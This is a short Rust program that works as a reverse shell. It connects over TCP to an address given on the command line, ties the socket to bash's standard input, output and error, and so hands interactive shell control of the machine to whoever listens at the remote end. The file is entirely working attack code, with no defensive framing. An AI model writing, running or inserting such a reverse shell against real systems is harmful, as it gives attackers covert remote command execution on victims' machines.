use std::fs::File;
use std::net::TcpStream;
use std::os::fd::{AsRawFd, FromRawFd, RawFd};
use std::process::{Command, Stdio};
use nix::libc::{c_int, dup};
use std::env;

fn dupliate_fd(fd: c_int) -> Stdio {
    let new_fd: RawFd = unsafe { dup(fd) };
    let stdio = unsafe { Stdio::from(File::from_raw_fd(new_fd)) };
    stdio
}

fn main() {
    let remote_ip = {
        let args: Vec<String> = env::args().collect();
        if args.len() <= 1{
            panic!("Usage: \n\t {} ip:port", args[0]);
        }
        println!("remote ip {}", &args[1]);
        args[1].clone()
    };

    let stream = TcpStream::connect(remote_ip).expect("Failed to connect remote server");
    let fd = stream.as_raw_fd();
    
    Command::new("bash")
        .stdin(dupliate_fd(fd))
        .stdout(dupliate_fd(fd))
        .stderr(dupliate_fd(fd))
        .spawn()
        .expect("Failed to spawn bash")
        .wait()
        .expect("Failed to wait on bash");
}
